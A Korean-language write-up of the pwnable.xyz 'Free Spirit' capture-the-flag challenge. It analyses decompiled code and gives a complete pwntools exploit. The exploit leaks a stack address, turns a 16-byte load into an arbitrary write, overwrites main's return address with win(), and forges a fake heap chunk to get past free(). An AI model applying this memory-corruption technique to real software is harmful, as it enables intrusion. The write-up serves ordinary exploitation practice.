# [pwnable.xyz] Free Spirit

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Free is misbehaving.
>
> Release: [Free Spirit.zip](https://github.com/h0meb0dy/pwnable.xyz/files/8935592/Free.Spirit.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/174483276-2e19e054-d60b-445a-ad22-121cf441ec6d.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat /flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `main()`

```
  v8.m128i_i64[1] = (__int64)malloc(0x40uLL);
```

메모리를 할당받아서 그 메모리의 주소를 `v8.m128i_i64[1]`이라는 변수에 저장하는데, 그냥 스택의 지역 변수이고 `rsp+0x10`에 위치한다.

```c
      _printf_chk(1LL, "> ");
      v3 = nptr;
      for ( i = 12LL; i; --i )
      {
        *(_DWORD *)v3 = 0;
        v3 += 4;
      }
      read(0, nptr, 0x30uLL);
      op = atoi(nptr);
```

옵션을 입력받는다. 옵션에 따라 프로그램이 할 동작이 정해진다.

```c
      if ( op != 1 )
        break;
      v6 = sys_read(0, (char *)v8.m128i_i64[1], 0x20uLL);
```

`1`을 입력하면 앞에서 할당받은 메모리에 `0x20`바이트만큼 입력을 받는다.

```c
    if ( op <= 1 )
      break;
```

`0`을 입력하면 반복문을 빠져나간다.

```c
    if ( op == 2 )
    {
      _printf_chk(1LL, "%p\n", &v8.m128i_u64[1]);
    }
```

`2`를 입력하면 앞에서 할당받은 메모리의 주소가 저장되어 있는 주소(스택의 주소)를 출력한다.

```c
    else if ( op == 3 )
    {
      if ( (unsigned int)limit <= 1 )
        v8 = _mm_loadu_si128((const __m128i *)v8.m128i_i64[1]);
    }
```

`3`을 입력하면 전역 변수 `limit`의 값이 1 이하인 경우에 동작하는데, 저 코드를 어셈블리로 보면 다음과 같다.

![image](https://user-images.githubusercontent.com/104156058/174483971-47b986cb-eafb-4ea2-be44-7d620dfcd266.png)

`rsp+0x10`에는 앞에서 할당받은 메모리의 주소가 들어 있는데, 그 메모리에 있는 16바이트 값을 가져와서 `rsp+0x8`에 넣는다.

```c
  if ( !v8.m128i_i64[1] )
    exit(1);
  free((void *)v8.m128i_i64[1]);
  return 0;
```

`main()` 함수가 종료되는 부분이다. 할당된 메모리의 주소가 없으면 `exit(1)`로 종료하고, 주소가 있으면 `free()`로 할당 해제한 다음 `return 0`으로 종료한다.

## Exploit

할당받은 메모리에서 16바이트를 가져와서 스택에 넣으면, 원래 `rsp+0x10`에 있던 메모리의 주소를 원하는 값으로 덮어쓸 수 있다. 여기에 임의의 주소를 넣으면, 그 주소에 `0x20`바이트만큼 문자열을 입력할 수 있다. 스택의 주소를 알려주기 때문에, 이를 이용하여 `main()`의 return address를 `win()`의 주소로 덮어쓰면 플래그를 획득할 수 있다.

`main()`의 마지막에 있는 `free()`를 오류 없이 넘어가야 한다. 스택에 fake chunk 구조를 만들어서 그 주소를 `free()`에 전달하면 된다.

### Full exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30005)

sla = r.sendlineafter
sa = r.sendafter

win = 0x400a3e

sla('> ', '2') # stack leak
rsp = int(r.recvline()[2:-1], 16) - 0x10 # rsp of main()

sla('> ', '1')
r.send(b'a' * 8 + p64(rsp + 0x68)) # rsp+0x68 -> return address of main
sla('> ', '3')

sla('> ', '1') # ret overwrite
r.send(p64(win) + p64(rsp + 0x78)) # rsp+0x78 -> size field of fake chunk
sla('> ', '3')

sla('> ', '1') # make fake chunk
r.send(p64(0x21) + p64(rsp + 0x80) + p64(0) + p64(0x20)) # rsp+0x80 -> address of fake chunk
sla('> ', '3')

sla('> ', '0')

r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30005: Done
[*] Switching to interactive mode
FLAG{I_promise_it_gets_better}
```